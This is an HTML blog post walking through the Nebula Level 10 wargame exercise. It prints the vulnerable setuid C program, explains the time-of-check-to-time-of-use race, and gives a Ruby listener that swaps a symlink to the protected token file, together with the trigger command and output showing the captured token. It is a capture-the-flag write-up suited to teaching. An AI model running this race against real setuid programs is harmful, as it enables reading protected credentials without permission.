@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>Exploit Exercises - Nebula Level 10 &middot; jc han</title>
+
+  
+  <link rel="stylesheet" href="http://hanjc.me/css/poole.css">
+  <link rel="stylesheet" href="http://hanjc.me/css/hyde.css">
+  <link rel="stylesheet" href="http://hanjc.me/css/poole-overrides.css">
+  <link rel="stylesheet" href="http://hanjc.me/css/hyde-overrides.css">
+  <link rel="stylesheet" href="http://hanjc.me/css/hyde-x.css">
+  
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+  <link href="/favicon.png" rel="icon">
+
+  
+  
+  
+  
+
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  
+</head>
+<body>
+  <div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      
+      <h1>jc han</h1>
+      
+    </div>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item"><a href="http://hanjc.me/">Blog</a></li>
+      
+    </ul>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item">
+      <a href="http://github.com/zealoct"><i class="fa fa-github-square fa-3x"></i></a>
+      
+      
+      
+      
+      <a href="@zealoct"><i class="fa fa-twitter-square fa-3x"></i></a>
+      </li>
+    </ul>
+
+    <p>Copyright &copy; 2015 <a href="http://hanjc.me/license">License</a><br/>
+       Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>
+  </div>
+</div>
+
+
+<div class="content container">
+  <div class="post">
+    <h1>Exploit Exercises - Nebula Level 10</h1>
+    <span class="post-date">Jan 25, 2014 &middot; 3 minute read &middot; <a href="http://hanjc.me/post/2014-01-25-nebula-level10/#disqus_thread">Comments</a>
+    
+    <br/>
+    
+    <a class="label" href="http://hanjc.me/categories/security">Security</a><a class="label" href="http://hanjc.me/categories/exercises">Exercises</a><a class="label" href="http://hanjc.me/categories/nebula">Nebula</a>
+    </span>
+    
+
+<h3 id="about:14691d9c48d881479fa7a5e0fa8d86be">About</h3>
+
+<p>The setuid binary at <em>/home/flag10/flag10</em> binary will upload any file given, as long as it meets the requirements of the <em>access()</em> system call.</p>
+
+<p>To do this level, log in as the <em>level10</em> account with the password <em>level10</em>. Files for this level can be found in /home/flag10.</p>
+
+<h3 id="source-code:14691d9c48d881479fa7a5e0fa8d86be">Source Code</h3>
+
+<pre><code class="language-c">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char **argv)
+{
+  char *file;
+  char *host;
+
+  if(argc &lt; 3) {
+    printf(&quot;%s file host\n\tsends file to host if you have access to it\n&quot;, argv[0]);
+    exit(1);
+  }
+
+  file = argv[1];
+  host = argv[2];
+
+  if(access(argv[1], R_OK) == 0) {
+    int fd;
+    int ffd;
+    int rc;
+    struct sockaddr_in sin;
+    char buffer[4096];
+  	
+    printf(&quot;Connecting to %s:18211 .. &quot;, host); fflush(stdout);
+  	
+    fd = socket(AF_INET, SOCK_STREAM, 0);
+  	
+    memset(&amp;sin, 0, sizeof(struct sockaddr_in));
+    sin.sin_family = AF_INET;
+    sin.sin_addr.s_addr = inet_addr(host);
+    sin.sin_port = htons(18211);
+  	
+    if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) {
+      printf(&quot;Unable to connect to host %s\n&quot;, host);
+      exit(EXIT_FAILURE);
+    }
+  	
+#define HITHERE &quot;.oO Oo.\n&quot;
+    if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
+      printf(&quot;Unable to write banner to host %s\n&quot;, host);
+      exit(EXIT_FAILURE);
+    }
+#undef HITHERE
+  
+    printf(&quot;Connected!\nSending file .. &quot;); fflush(stdout);
+  	
+    ffd = open(file, O_RDONLY);
+    if(ffd == -1) {
+      printf(&quot;Damn. Unable to open file\n&quot;);
+      exit(EXIT_FAILURE);
+    }
+  	
+    rc = read(ffd, buffer, sizeof(buffer));
+    if(rc == -1) {
+      printf(&quot;Unable to read from file: %s\n&quot;, strerror(errno));
+      exit(EXIT_FAILURE);
+    }
+  	
+    write(fd, buffer, rc);
+  	
+    printf(&quot;wrote file!\n&quot;);
+  } else {
+    printf(&quot;You don't have access to %s\n&quot;, file);
+  }
+}
+</code></pre>
+
+<!-- more -->
+
+<p>There at two files in the directory /home/flag10, <em>flag10</em> and <em>token</em>. The source code of executable <em>flag10</em> in shown above, and <em>token</em> contains the password of user <em>flag10</em>. The goal is to read the content of <em>token</em>.</p>
+
+<p>The attack comes from a common bug called <a href="http://en.wikipedia.org/wiki/Time-of-check-to-time-of-use">Time of check to time of use</a>, the Wiki page above explains precisely about what this bug is and how it can be exploited. So in my imagination this is how this attack would look like:</p>
+
+<ol>
+<li>pass <em>/home/level10/token</em> whick links to a real user(<em>level10</em>) readable file <em>/home/level10/test</em> to the program as <code>argv[1]</code></li>
+<li><em>/home/flag10/flag10</em> checks whether this file is accessable at line 24(with the result true)</li>
+<li>modify the file to link to <em>/home/flag10/token</em> when <em>/home/flag10/flag10</em> is executing code between line 24 and line 54</li>
+<li>when <em>/home/flag10/flag10</em> reads the file at line 54, it reads <em>/home/flag10/token</em></li>
+</ol>
+
+<p>The most important step mentioned above is step 3, it is hard to control the time! Fortunately, the <em>flag10</em> program will send a banner before actually read the file(line 46), this leaves me some time to make some change!</p>
+
+<p>Notice that the content of the file would be transmit through a socket connection, so I need to write my own server code. In my consideration, I need to change the file <em>/home/level10/token</em> immediately after the server accepts a connection from the client, I wrote this server code in Ruby:</p>
+
+<pre><code class="language-ruby">require 'socket'
+
+server = TCPServer.new(18211)
+loop {
+    client = server.accept
+    `rm /home/level10/token; ln -s /home/flag10/token /home/level10/token`
+    while msg = client.gets
+        puts &quot;RECV: #{msg}&quot;
+    end
+}
+</code></pre>
+
+<p>After the server was started, I triggered the vulnerability with the following command</p>
+
+<pre><code>$ /home/flag10/flag10 ~/token 127.0.0.1
+</code></pre>
+
+<p>Note that the symbolic file <em>~/token</em> must exist and point to a file that is readable by user <em>level10</em> before the program <em>flag10</em> is executed.</p>
+
+<p>The output of the Ruby code was not always as expected, sometimes the client read the file before the server changed it, but as long as it could be right, it hacked!</p>
+
+<pre><code class="language-bash">level10@nebula:~$ ruby serv.rb 
+RECV: .oO Oo.
+RECV: hello world
+
+level10@nebula:~$ ruby serv.rb 
+RECV: .oO Oo.
+RECV: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+</code></pre>
+
+  </div>
+  <div id="disqus_thread"></div>
+</div>
+
+
+<script type="text/javascript">
+var disqus_shortname = "hanjc";
+(function () {
+    var s = document.createElement('script'); s.async = true;
+    s.type = 'text/javascript';
+    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+}());
+</script>
+
+
+
+<script type="text/javascript">
+    var disqus_shortname = "hanjc";
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+</body>
+</html>
